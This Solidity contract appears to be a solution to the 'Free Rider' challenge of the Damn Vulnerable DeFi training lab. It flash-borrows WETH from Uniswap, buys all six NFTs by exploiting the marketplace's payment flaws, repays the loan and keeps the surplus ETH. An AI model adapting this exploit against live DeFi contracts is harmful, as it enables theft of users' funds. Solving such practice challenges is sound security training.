// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {sl} from "@solc-log/sl.sol";
import "@src/damn-vulnerable-defi/10-free-rider/FreeRiderNFTMarketplace.sol";
import "@src/damn-vulnerable-defi/10-free-rider/FreeRiderRecovery.sol";
import "@src/damn-vulnerable-defi/09-puppet-v2/Interfaces.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@src/damn-vulnerable-defi/WETH9.sol";

contract FlashBuyer {
  IUniswapV2Pair internal _uniswapV2Pair;
  WETH9 internal _weth;
  FreeRiderNFTMarketplace internal _freeRiderNFTMarketplace;
  FreeRiderRecovery internal _freeRiderRecovery;
  address _player;
  constructor(address uniswapV2Pair, address payable weth, address payable freeRiderNFTMarketplace, address payable freeRiderRecovery, address player) {
    _uniswapV2Pair = IUniswapV2Pair(uniswapV2Pair);
    _weth = WETH9(weth);
    _freeRiderNFTMarketplace = FreeRiderNFTMarketplace(freeRiderNFTMarketplace);
    _freeRiderRecovery = FreeRiderRecovery(freeRiderRecovery);
    _player = player;
  }

  function flashBuy() payable public {
    _weth.deposit{value: msg.value}();
    sl.log("Weth balance before flash swapping: ", _weth.balanceOf(address(this)));

    // 15 eth per NFT
    _uniswapV2Pair.swap(15 ether, 0, address(this), "0x");
    sl.log("WETH balance after swaps: ", _weth.balanceOf(address(this)));
    sl.log("ETH balance after swaps: ", address(this).balance);

    bytes memory data = abi.encode(_player);
    for (uint256 i = 0; i < 6; i++) {
      _freeRiderNFTMarketplace.token().safeTransferFrom(
        address(this), address(_freeRiderRecovery), i, data
      );
    }

    _weth.withdraw(_weth.balanceOf(address(this)));
    (bool success, ) = _player.call{value: address(this).balance}("");
    require(success, "Transfer failed.");
  }

  function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
  ) external {
    require(msg.sender == address(_uniswapV2Pair)); // ensure that msg.sender is a V2 pair
    require(sender == address(this)); // ensure that FlashSwap is the sender
    sl.indent();
    sl.logLineDelimiter("uniswapV2Call");
    sl.log("Amount0 borrowed: ", amount0);
    sl.log("Amount1 borrowed: ", amount1);
    sl.log("FlashSwap WETH balance during swap: ", _weth.balanceOf(address(this)));
    sl.log("FlashSwap WETH allowance", _weth.allowance(address(_uniswapV2Pair), address(this)));

    uint256 owed = _uniswapV2Pair.token0() == address(_weth) ? amount0 : amount1;
    uint256 feeAndOwed = (owed * 3 / 997 + 1) + owed;
    sl.log("Fee and owed: ", feeAndOwed);

    uint256[] memory tokenIds = new uint256[](6); // or AMOUNT_OF_NFTS
    tokenIds[0] = 0;
    tokenIds[1] = 1;
    tokenIds[2] = 2;
    tokenIds[3] = 3;
    tokenIds[4] = 4;
    tokenIds[5] = 5;
    _weth.withdraw(_weth.balanceOf(address(this)));
    _freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
    sl.log("Eth balance after buying NFT: ", address(this).balance);
    sl.log("Weth balance after buying NFT: ", _weth.balanceOf(address(this)));
    _weth.deposit{value: address(this).balance}();

    WETH9(_weth).transfer(address(_uniswapV2Pair), feeAndOwed);
    sl.outdent();
  }

  receive() external payable {}

  function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external pure returns (bytes4)
    {
      return IERC721Receiver.onERC721Received.selector;
    }
}